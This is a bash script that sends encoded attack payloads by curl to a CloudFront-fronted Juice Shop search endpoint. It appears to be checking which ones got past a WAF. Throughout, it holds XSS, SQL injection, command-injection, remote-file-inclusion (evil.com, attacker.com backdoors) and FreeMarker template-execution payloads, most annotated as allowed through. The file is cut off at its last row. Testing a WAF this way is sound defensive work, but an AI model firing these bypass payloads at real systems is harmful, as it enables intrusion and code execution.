#!/usr/bin/env bash
# verify_failed_get.sh
# Direct-curl verification for GET rows where CloudFront WAF DID NOT block.
# Source: validate_log_baseline13_get.json (Apr 27, 2026 GET run)
# Per row, URL-encodes the YAML payload into ?q= exactly as test_runner.py does.
#   -sk    : silent, ignore TLS
#   -i     : include response headers (status line + headers in output)
#   -m 15  : 15-second total timeout per request
# Tip: pipe through 'grep -E "^HTTP|^X-Amz-Cf-Id"' for a terse summary.

USER_AGENT="dlpaasrngb6ue.cloudfront.net"
CF_HOST="dlpaasrngb6ue.cloudfront.net"

set -u

echo
echo "=== juiceshop-0001 | verdict=NO_CF_LOG | http=403 | tuning=xss ==="
printf '    payload: %s\n' '<script>alert(1)</script>'
curl -sk -i -m 15 'https://dlpaasrngb6ue.cloudfront.net/rest/products/search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E' -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0002 | verdict=NO_CF_LOG | http=200 | tuning=xss ==="
printf '    payload: %s\n' '%253Cscript%253Ealert(1)%253C/script%253E'
curl -sk -i -m 15 'https://dlpaasrngb6ue.cloudfront.net/rest/products/search?q=%25253Cscript%25253Ealert%281%29%25253C%2Fscript%25253E' -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0003 | verdict=NO_CF_LOG | http=403 | tuning=xss ==="
printf '    payload: %s\n' '&lt;script&gt;alert(1)&lt;/script&gt;'
curl -sk -i -m 15 'https://dlpaasrngb6ue.cloudfront.net/rest/products/search?q=%26lt%3Bscript%26gt%3Balert%281%29%26lt%3B%2Fscript%26gt%3B' -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0004 | verdict=NO_CF_LOG | http=403 | tuning=xss ==="
printf '    payload: %s\n' '<scr<script>ipt>alert(1)</scr</script>ipt>'
curl -sk -i -m 15 'https://dlpaasrngb6ue.cloudfront.net/rest/products/search?q=%3Cscr%3Cscript%3Eipt%3Ealert%281%29%3C%2Fscr%3C%2Fscript%3Eipt%3E' -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0005 | verdict=NO_CF_LOG | http=403 | tuning=xss ==="
printf '    payload: %s\n' '<script>alert&#40;1&#41;</script>'
curl -sk -i -m 15 'https://dlpaasrngb6ue.cloudfront.net/rest/products/search?q=%3Cscript%3Ealert%26%2340%3B1%26%2341%3B%3C%2Fscript%3E' -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0006 | verdict=NO_CF_LOG | http=403 | tuning=xss ==="
printf '    payload: %s\n' '<script>alert\\x281\\x29</script>'
curl -sk -i -m 15 'https://dlpaasrngb6ue.cloudfront.net/rest/products/search?q=%3Cscript%3Ealert%5C%5Cx281%5C%5Cx29%3C%2Fscript%3E' -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0010 | verdict=NO_CF_LOG | http=403 | tuning=xss ==="
printf '    payload: %s\n' '%3cscript%3ealert(1)%3c%2fscript%3e'
curl -sk -i -m 15 'https://dlpaasrngb6ue.cloudfront.net/rest/products/search?q=%253cscript%253ealert%281%29%253c%252fscript%253e' -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0011 | verdict=NO_CF_LOG | http=403 | tuning=xss ==="
printf '    payload: %s\n' '%3Csvg%20onload%3D%22confirm%28document.domain%29%22%3E'
curl -sk -i -m 15 'https://dlpaasrngb6ue.cloudfront.net/rest/products/search?q=%253Csvg%2520onload%253D%2522confirm%2528document.domain%2529%2522%253E' -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0012 | verdict=NO_CF_LOG | http=403 | tuning=xss ==="
printf '    payload: %s\n' '%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E'
curl -sk -i -m 15 'https://dlpaasrngb6ue.cloudfront.net/rest/products/search?q=%253Cimg%2520src%253Dx%2520onerror%253Dalert%281%29%253E' -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0013 | verdict=NO_CF_LOG | http=403 | tuning=xss ==="
printf '    payload: %s\n' '%3Ciframe%20src%3D%22javascript%3Aalert(1)%22%3E'
curl -sk -i -m 15 'https://dlpaasrngb6ue.cloudfront.net/rest/products/search?q=%253Ciframe%2520src%253D%2522javascript%253Aalert%281%29%2522%253E' -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0014 | verdict=NO_CF_LOG | http=200 | tuning=xss ==="
printf '    payload: %s\n' '%3Cscrscriptipt%3Ealert%281%29%3C%2Fscrscriptipt%3E'
curl -sk -i -m 15 'https://dlpaasrngb6ue.cloudfront.net/rest/products/search?q=%253Cscrscriptipt%253Ealert%25281%2529%253C%252Fscrscriptipt%253E' -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0016 | verdict=NO_CF_LOG | http=403 | tuning=xss ==="
printf '    payload: %s\n' '"><script>alert(1)</script>'
curl -sk -i -m 15 'https://dlpaasrngb6ue.cloudfront.net/rest/products/search?q=%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E' -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0020 | verdict=NO_CF_LOG | http=403 | tuning=xss ==="
printf '    payload: %s\n' '<svg><script xlink:href=data:,alert(1)>'
curl -sk -i -m 15 'https://dlpaasrngb6ue.cloudfront.net/rest/products/search?q=%3Csvg%3E%3Cscript%20xlink%3Ahref%3Ddata%3A%2Calert%281%29%3E' -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0031 | verdict=CF_ALLOW_ALB_ALLOW | http=200 | tuning=xss ==="
printf '    payload: %s\n' '"><img src=x o%6ener%72=alert(1)>'
curl -sk -i -m 15 'https://dlpaasrngb6ue.cloudfront.net/rest/products/search?q=%22%3E%3Cimg%20src%3Dx%20o%256ener%2572%3Dalert%281%29%3E' -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0036 | verdict=CF_ALLOW_ALB_ALLOW | http=200 | tuning=base64 ==="
printf '    payload: %s\n' 'PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='
curl -sk -i -m 15 'https://dlpaasrngb6ue.cloudfront.net/rest/products/search?q=PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg%3D%3D' -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0037 | verdict=CF_ALLOW_ALB_ALLOW | http=200 | tuning=xss ==="
printf '    payload: %s\n' '<scr<!-- -->ipt>alert(1)</scr<!-- -->ipt>'
curl -sk -i -m 15 'https://dlpaasrngb6ue.cloudfront.net/rest/products/search?q=%3Cscr%3C%21--%20--%3Eipt%3Ealert%281%29%3C%2Fscr%3C%21--%20--%3Eipt%3E' -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0049 | verdict=CF_ALLOW_ALB_ALLOW | http=500 | tuning=sqli ==="
printf '    payload: %s\n' 'admin'\'' #'
curl -sk -i -m 15 'https://dlpaasrngb6ue.cloudfront.net/rest/products/search?q=admin%27%20%23' -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0050 | verdict=CF_ALLOW_ALB_ALLOW | http=200 | tuning=sqli ==="
printf '    payload: %s\n' '%27%20OR%201=1--'
curl -sk -i -m 15 'https://dlpaasrngb6ue.cloudfront.net/rest/products/search?q=%2527%2520OR%25201%3D1--' -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0053 | verdict=CF_ALLOW_ALB_ALLOW | http=200 | tuning=sqli ==="
printf '    payload: %s\n' '%2527%2520OR%25201%253D1--'
curl -sk -i -m 15 'https://dlpaasrngb6ue.cloudfront.net/rest/products/search?q=%252527%252520OR%2525201%25253D1--' -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0054 | verdict=CF_ALLOW_ALB_ALLOW | http=200 | tuning=sqli ==="
printf '    payload: %s\n' '%27OR+1%3D1--'
curl -sk -i -m 15 'https://dlpaasrngb6ue.cloudfront.net/rest/products/search?q=%2527OR%2B1%253D1--' -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0055 | verdict=CF_ALLOW_ALB_ALLOW | http=200 | tuning=sqli ==="
printf '    payload: %s\n' '%27+OR+1%3D1--'
curl -sk -i -m 15 'https://dlpaasrngb6ue.cloudfront.net/rest/products/search?q=%2527%2BOR%2B1%253D1--' -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0056 | verdict=CF_ALLOW_ALB_ALLOW | http=200 | tuning=sqli ==="
printf '    payload: %s\n' '%27--+'
curl -sk -i -m 15 'https://dlpaasrngb6ue.cloudfront.net/rest/products/search?q=%2527--%2B' -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0057 | verdict=CF_ALLOW_ALB_ALLOW | http=200 | tuning=xss ==="
printf '    payload: %s\n' '%27%23'
curl -sk -i -m 15 'https://dlpaasrngb6ue.cloudfront.net/rest/products/search?q=%2527%2523' -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0058 | verdict=CF_ALLOW_ALB_ALLOW | http=200 | tuning=xss ==="
printf '    payload: %s\n' '%2F%2A%2A%2F'
curl -sk -i -m 15 'https://dlpaasrngb6ue.cloudfront.net/rest/products/search?q=%252F%252A%252A%252F' -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0059 | verdict=CF_ALLOW_ALB_ALLOW | http=200 | tuning=sqli ==="
printf '    payload: %s\n' '%27)%20OR%20(%271%27=%271'
curl -sk -i -m 15 'https://dlpaasrngb6ue.cloudfront.net/rest/products/search?q=%2527%29%2520OR%2520%28%25271%2527%3D%25271' -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0066 | verdict=CF_ALLOW_ALB_ALLOW | http=200 | tuning=sqli ==="
printf '    payload: %s\n' '%27%20OR%201%3D1%20--%20'
curl -sk -i -m 15 'https://dlpaasrngb6ue.cloudfront.net/rest/products/search?q=%2527%2520OR%25201%253D1%2520--%2520' -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0067 | verdict=CF_ALLOW_ALB_ALLOW | http=500 | tuning=sqli ==="
printf '    payload: %s\n' '%27)%20OR%20('\''1'\''%3D'\''1'
curl -sk -i -m 15 'https://dlpaasrngb6ue.cloudfront.net/rest/products/search?q=%2527%29%2520OR%2520%28%271%27%253D%271' -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0069 | verdict=CF_ALLOW_ALB_ALLOW | http=200 | tuning=sqli ==="
printf '    payload: %s\n' '%27%20OR%201=1%20--%20'
curl -sk -i -m 15 'https://dlpaasrngb6ue.cloudfront.net/rest/products/search?q=%2527%2520OR%25201%3D1%2520--%2520' -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0070 | verdict=CF_ALLOW_ALB_ALLOW | http=200 | tuning=sqli ==="
printf '    payload: %s\n' '%27%20UNION%20SELECT%201,2,3--'
curl -sk -i -m 15 'https://dlpaasrngb6ue.cloudfront.net/rest/products/search?q=%2527%2520UNION%2520SELECT%25201%2C2%2C3--' -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0071 | verdict=CF_ALLOW_ALB_ALLOW | http=200 | tuning=sqli ==="
printf '    payload: %s\n' 'admin%27--+'
curl -sk -i -m 15 'https://dlpaasrngb6ue.cloudfront.net/rest/products/search?q=admin%2527--%2B' -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0072 | verdict=CF_ALLOW_ALB_ALLOW | http=200 | tuning=sqli ==="
printf '    payload: %s\n' 'admin%27%2f%2a%2a%2f--'
curl -sk -i -m 15 'https://dlpaasrngb6ue.cloudfront.net/rest/products/search?q=admin%2527%252f%252a%252a%252f--' -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0074 | verdict=CF_ALLOW_ALB_ALLOW | http=200 | tuning=sqli ==="
printf '    payload: %s\n' '%27%2bOR%2b1%3d1--'
curl -sk -i -m 15 'https://dlpaasrngb6ue.cloudfront.net/rest/products/search?q=%2527%252bOR%252b1%253d1--' -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0075 | verdict=CF_ALLOW_ALB_ALLOW | http=200 | tuning=sqli ==="
printf '    payload: %s\n' '%60%27%20OR%201=1--'
curl -sk -i -m 15 'https://dlpaasrngb6ue.cloudfront.net/rest/products/search?q=%2560%2527%2520OR%25201%3D1--' -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0076 | verdict=CF_ALLOW_ALB_ALLOW | http=200 | tuning=sqli ==="
printf '    payload: %s\n' '%2527%2520OR%25201%253D1--+'
curl -sk -i -m 15 'https://dlpaasrngb6ue.cloudfront.net/rest/products/search?q=%252527%252520OR%2525201%25253D1--%2B' -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0077 | verdict=CF_ALLOW_ALB_ALLOW | http=200 | tuning=sqli ==="
printf '    payload: %s\n' '%27%2b%4f%52%2b1%3d1--+'
curl -sk -i -m 15 'https://dlpaasrngb6ue.cloudfront.net/rest/products/search?q=%2527%252b%254f%2552%252b1%253d1--%2B' -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0078 | verdict=CF_ALLOW_ALB_ALLOW | http=200 | tuning=sqli ==="
printf '    payload: %s\n' '%2527%2f%2a%2a%2f%2bOR%2b1%3D1--+'
curl -sk -i -m 15 'https://dlpaasrngb6ue.cloudfront.net/rest/products/search?q=%252527%252f%252a%252a%252f%252bOR%252b1%253D1--%2B' -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0080 | verdict=CF_ALLOW_ALB_ALLOW | http=200 | tuning=sqli ==="
printf '    payload: %s\n' '0%27%20UNION%20SELECT%20null,null,null--+'
curl -sk -i -m 15 'https://dlpaasrngb6ue.cloudfront.net/rest/products/search?q=0%2527%2520UNION%2520SELECT%2520null%2Cnull%2Cnull--%2B' -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0090 | verdict=CF_ALLOW_ALB_ALLOW | http=200 | tuning=sqli ==="
printf '    payload: %s\n' '1=1'
curl -sk -i -m 15 'https://dlpaasrngb6ue.cloudfront.net/rest/products/search?q=1%3D1' -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0096 | verdict=CF_ALLOW_ALB_ALLOW | http=200 | tuning=sqli ==="
printf '    payload: %s\n' '1%27%20AND%201%3D1%20--'
curl -sk -i -m 15 'https://dlpaasrngb6ue.cloudfront.net/rest/products/search?q=1%2527%2520AND%25201%253D1%2520--' -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0098 | verdict=CF_ALLOW_ALB_ALLOW | http=200 | tuning=base64 ==="
printf '    payload: %s\n' 'JyBPUiAnMT0nJz0nMQ=='
curl -sk -i -m 15 'https://dlpaasrngb6ue.cloudfront.net/rest/products/search?q=JyBPUiAnMT0nJz0nMQ%3D%3D' -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0101 | verdict=CF_ALLOW_ALB_ALLOW | http=200 | tuning=sqli ==="
printf '    payload: %s\n' '1%a0OR%a01=1'
curl -sk -i -m 15 'https://dlpaasrngb6ue.cloudfront.net/rest/products/search?q=1%25a0OR%25a01%3D1' -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0104 | verdict=CF_ALLOW_ALB_ALLOW | http=500 | tuning=xss ==="
printf '    payload: %s\n' ''\''#'
curl -sk -i -m 15 'https://dlpaasrngb6ue.cloudfront.net/rest/products/search?q=%27%23' -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0115 | verdict=CF_ALLOW_ALB_ALLOW | http=200 | tuning=sqli ==="
printf '    payload: %s\n' '%27%20OR%201%3D1--+'
curl -sk -i -m 15 'https://dlpaasrngb6ue.cloudfront.net/rest/products/search?q=%2527%2520OR%25201%253D1--%2B' -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0117 | verdict=CF_ALLOW_ALB_ALLOW | http=200 | tuning=sqli ==="
printf '    payload: %s\n' '%2527%2520OR%25201%253D1%2520--'
curl -sk -i -m 15 'https://dlpaasrngb6ue.cloudfront.net/rest/products/search?q=%252527%252520OR%2525201%25253D1%252520--' -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0118 | verdict=CF_ALLOW_ALB_ALLOW | http=200 | tuning=cmdi ==="
printf '    payload: %s\n' ';`id`'
curl -sk -i -m 15 'https://dlpaasrngb6ue.cloudfront.net/rest/products/search?q=%3B%60id%60' -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0125 | verdict=CF_ALLOW_ALB_ALLOW | http=200 | tuning=cmdi ==="
printf '    payload: %s\n' '%2526%2526whoami'
curl -sk -i -m 15 'https://dlpaasrngb6ue.cloudfront.net/rest/products/search?q=%252526%252526whoami' -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0126 | verdict=CF_ALLOW_ALB_ALLOW | http=200 | tuning=cmdi ==="
printf '    payload: %s\n' '$\{@print(md5(1234))\}'
curl -sk -i -m 15 'https://dlpaasrngb6ue.cloudfront.net/rest/products/search?q=%24%5C%7B%40print%28md5%281234%29%29%5C%7D' -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0131 | verdict=CF_ALLOW_ALB_ALLOW | http=200 | tuning=xss ==="
printf '    payload: %s\n' '%60curl$\{IFS\}attacker.com%60'
curl -sk -i -m 15 'https://dlpaasrngb6ue.cloudfront.net/rest/products/search?q=%2560curl%24%5C%7BIFS%5C%7Dattacker.com%2560' -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0140 | verdict=CF_ALLOW_ALB_ALLOW | http=200 | tuning=cmdi ==="
printf '    payload: %s\n' '$\{@print(md5(1))\}'
curl -sk -i -m 15 'https://dlpaasrngb6ue.cloudfront.net/rest/products/search?q=%24%5C%7B%40print%28md5%281%29%29%5C%7D' -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0142 | verdict=CF_ALLOW_ALB_ALLOW | http=200 | tuning=cmdi ==="
printf '    payload: %s\n' '%3B%20id'
curl -sk -i -m 15 'https://dlpaasrngb6ue.cloudfront.net/rest/products/search?q=%253B%2520id' -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0143 | verdict=CF_ALLOW_ALB_ALLOW | http=200 | tuning=cmdi ==="
printf '    payload: %s\n' '%60uname%20-a%60'
curl -sk -i -m 15 'https://dlpaasrngb6ue.cloudfront.net/rest/products/search?q=%2560uname%2520-a%2560' -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0169 | verdict=CF_ALLOW_ALB_ALLOW | http=200 | tuning=rfi ==="
printf '    payload: %s\n' '%68%74%74%70%3a%2f%2fattacker.com%2fcode.txt'
curl -sk -i -m 15 'https://dlpaasrngb6ue.cloudfront.net/rest/products/search?q=%2568%2574%2574%2570%253a%252f%252fattacker.com%252fcode.txt' -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0170 | verdict=CF_ALLOW_ALB_ALLOW | http=200 | tuning=rfi ==="
printf '    payload: %s\n' 'https://evil.com/backdoor.php'
curl -sk -i -m 15 'https://dlpaasrngb6ue.cloudfront.net/rest/products/search?q=https%3A%2F%2Fevil.com%2Fbackdoor.php' -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0171 | verdict=CF_ALLOW_ALB_ALLOW | http=200 | tuning=rfi ==="
printf '    payload: %s\n' '%252f%252fmalicious.com%252fshell.txt'
curl -sk -i -m 15 'https://dlpaasrngb6ue.cloudfront.net/rest/products/search?q=%25252f%25252fmalicious.com%25252fshell.txt' -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0172 | verdict=CF_ALLOW_ALB_ALLOW | http=200 | tuning=rfi ==="
printf '    payload: %s\n' '%5c%5cattacker.com%5cbackdoor.txt'
curl -sk -i -m 15 'https://dlpaasrngb6ue.cloudfront.net/rest/products/search?q=%255c%255cattacker.com%255cbackdoor.txt' -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0173 | verdict=CF_ALLOW_ALB_ALLOW | http=200 | tuning=rfi ==="
printf '    payload: %s\n' 'https://attacker.site/malware.php'
curl -sk -i -m 15 'https://dlpaasrngb6ue.cloudfront.net/rest/products/search?q=https%3A%2F%2Fattacker.site%2Fmalware.php' -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0177 | verdict=CF_ALLOW_ALB_ALLOW | http=200 | tuning=rfi ==="
printf '    payload: %s\n' 'http%3A%2F%2Fevil.com%2Fshell.txt'
curl -sk -i -m 15 'https://dlpaasrngb6ue.cloudfront.net/rest/products/search?q=http%253A%252F%252Fevil.com%252Fshell.txt' -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0183 | verdict=CF_ALLOW_ALB_ALLOW | http=500 | tuning=xss ==="
printf '    payload: %s\n' 'new%20Function('\''alert(1)'\'')()'
curl -sk -i -m 15 'https://dlpaasrngb6ue.cloudfront.net/rest/products/search?q=new%2520Function%28%27alert%281%29%27%29%28%29' -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0205 | verdict=CF_ALLOW_ALB_ALLOW | http=500 | tuning=xss ==="
printf '    payload: %s\n' '&#x3C;!--%2Balert('\''Payload7'\'')%2B--&#x3E;'
curl -sk -i -m 15 'https://dlpaasrngb6ue.cloudfront.net/rest/products/search?q=%26%23x3C%3B%21--%252Balert%28%27Payload7%27%29%252B--%26%23x3E%3B' -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0216 | verdict=CF_ALLOW_ALB_ALLOW | http=200 | tuning=ssti ==="
printf '    payload: %s\n' '<%= 7 * 7 %>'
curl -sk -i -m 15 'https://dlpaasrngb6ue.cloudfront.net/rest/products/search?q=%3C%25%3D%207%20%2A%207%20%25%3E' -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0217 | verdict=CF_ALLOW_ALB_ALLOW | http=200 | tuning=ssti ==="
printf '    payload: %s\n' '$\{7*7\}'
curl -sk -i -m 15 'https://dlpaasrngb6ue.cloudfront.net/rest/products/search?q=%24%5C%7B7%2A7%5C%7D' -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0219 | verdict=CF_ALLOW_ALB_ALLOW | http=200 | tuning=ssti ==="
printf '    payload: %s\n' '%7B%7B7*7%7D%7D'
curl -sk -i -m 15 'https://dlpaasrngb6ue.cloudfront.net/rest/products/search?q=%257B%257B7%2A7%257D%257D' -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0220 | verdict=CF_ALLOW_ALB_ALLOW | http=200 | tuning=ssti ==="
printf '    payload: %s\n' '%24%7B7*7%7D'
curl -sk -i -m 15 'https://dlpaasrngb6ue.cloudfront.net/rest/products/search?q=%2524%257B7%2A7%257D' -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0221 | verdict=CF_ALLOW_ALB_ALLOW | http=200 | tuning=ssti ==="
printf '    payload: %s\n' '$\{3*3\}'
curl -sk -i -m 15 'https://dlpaasrngb6ue.cloudfront.net/rest/products/search?q=%24%5C%7B3%2A3%5C%7D' -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0222 | verdict=CF_ALLOW_ALB_ALLOW | http=200 | tuning=ssti ==="
printf '    payload: %s\n' '$\{\{7*7\}\}'
curl -sk -i -m 15 'https://dlpaasrngb6ue.cloudfront.net/rest/products/search?q=%24%5C%7B%5C%7B7%2A7%5C%7D%5C%7D' -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0223 | verdict=CF_ALLOW_ALB_ALLOW | http=200 | tuning=ssti ==="
printf '    payload: %s\n' '@(1+2)'
curl -sk -i -m 15 'https://dlpaasrngb6ue.cloudfront.net/rest/products/search?q=%40%281%2B2%29' -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0225 | verdict=CF_ALLOW_ALB_ALLOW | http=200 | tuning=ssti ==="
printf '    payload: %s\n' '<#assign ex = "freemarker.template.utility.Execute"?new()>$\{ ex("id")…'
curl -sk -i -m 15 'https://dlpaasrngb6ue.cloudfront.net/rest/products/search?q=%3C%23assign%20ex%20%3D%20%22freemarker.template.utility.Execute%22%3Fnew%28%29%3E%24%5C%7B%20ex%28%22id%22%29%5C%7D' -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0226 | verdict=CF_ALLOW_ALB_ALLOW | http=500 | tuning=ssti ==="
printf '    payload: %s\n' '[#assign ex = '\''freemarker.template.utility.Execute'\''?new()]$\{ ex('\''id'\'')…'
curl -sk -i -m 15 'https://dlpaasrngb6ue.cloudfront.net/rest/products/search?q=%5B%23assign%20ex%20%3D%20%27freemarker.template.utility.Execute%27%3Fnew%28%29%5D%24%5C%7B%20ex%28%27id%27%29%5C%7D' -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0227 | verdict=CF_ALLOW_ALB_ALLOW | http=200 | tuning=ssti ==="
printf '    payload: %s\n' '$\{"freemarker.template.utility.Execute"?new()("id")\}'
curl -sk -i -m 15 'https://dlpaasrngb6ue.cloudfront.net/rest/products/search?q=%24%5C%7B%22freemarker.template.utility.Execute%22%3Fnew%28%29%28%22id%22%29%5C%7D' -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0288 | verdict=CF_ALLOW_ALB_ALLOW | http=500 | tuning=sqli ==="
printf '    payload: %s\n' ''\''%09OR%091=1'
curl -sk -i -m 15 'https://dlpaasrngb6ue.cloudfront.net/rest/products/search?q=%27%2509OR%25091%3D1' -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0289 | verdict=CF_ALLOW_ALB_ALLOW | http=500 | tuning=sqli ==="
printf '    payload: %s\n' ''\''%20oR%201=1--'
curl -sk -i -m 15 'https://dlpaasrngb6ue.cloudfront.net/rest/products/search?q=%27%2520oR%25201%3D1--' -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0296 | verdict=CF_ALLOW_ALB_ALLOW | http=500 | tuning=sqli ==="
printf '    payload: %s\n' ''\''%2f**%2fOR%2f**%2f1=1--'
curl -sk -i -m 15 'https://dlpaasrngb6ue.cloudfront.net/rest/products/search?q=%27%252f%2A%2A%252fOR%252f%2A%2A%252f1%3D1--' -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0306 | verdict=CF_ALLOW_ALB_ALLOW | http=200 | tuning=sqli ==="
printf '    payload: %s\n' '%u0027%20OR%201=1--'
curl -sk -i -m 15 'https://dlpaasrngb6ue.cloudfront.net/rest/products/search?q=%25u0027%2520OR%25201%3D1--' -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0307 | verdict=CF_ALLOW_ALB_ALLOW | http=200 | tuning=sqli ==="
printf '    payload: %s\n' '%2527%2520OR%25201=1--'
curl -sk -i -m 15 'https://dlpaasrngb6ue.cloudfront.net/rest/products/search?q=%252527%252520OR%2525201%3D1--' -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0308 | verdict=CF_ALLOW_ALB_ALLOW | http=200 | tuning=sqli ==="
printf '    payload: %s\n' '%27UNION%0ASELECT%0ANULL,NULL--'
curl -sk -i -m 15 'https://dlpaasrngb6ue.cloudfront.net/rest/products/search?q=%2527UNION%250ASELECT%250ANULL%2CNULL--' -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0314 | verdict=CF_ALLOW_ALB_ALLOW | http=200 | tuning=sqli ==="
printf '    payload: %s\n' '1+oR+1=1'
curl -sk -i -m 15 'https://dlpaasrngb6ue.cloudfront.net/rest/products/search?q=1%2BoR%2B1%3D1' -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0315 | verdict=CF_ALLOW_ALB_ALLOW | http=200 | tuning=sqli ==="
printf '    payload: %s\n' '1%0bOR%0b1=1'
curl -sk -i -m 15 'https://dlpaasrngb6ue.cloudfront.net/rest/products/search?q=1%250bOR%250b1%3D1' -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0319 | verdict=CF_ALLOW_ALB_ALLOW | http=500 | tuning=sqli ==="
printf '    payload: %s\n' ''\''--%00'
curl -sk -i -m 15 'https://dlpaasrngb6ue.cloudfront.net/rest/products/search?q=%27--%2500' -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0320 | verdict=NO_CF_LOG | http=403 | tuning=xss ==="
printf '    payload: %s\n' '/etc/passwd'
curl -sk -i -m 15 'https://dlpaasrngb6ue.cloudfront.net/rest/products/search?q=%2Fetc%2Fpasswd' -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0328 | verdict=CF_ALLOW_ALB_ALLOW | http=500 | tuning=sqli ==="
printf '    payload: %s\n' '1'\'';--'
curl -sk -i -m 15 'https://dlpaasrngb6ue.cloudfront.net/rest/products/search?q=1%27%3B--' -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0334 | verdict=CF_ALLOW_ALB_ALLOW | http=200 | tuning=sqli ==="
printf '    payload: %s\n' '%31%27%20--'
curl -sk -i -m 15 'https://dlpaasrngb6ue.cloudfront.net/rest/products/search?q=%2531%2527%2520--' -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0336 | verdict=CF_ALLOW_ALB_ALLOW | http=200 | tuning=sqli ==="
printf '    payload: %s\n' '%27%2F**%2FOR%2F**%2F1%3D1--'
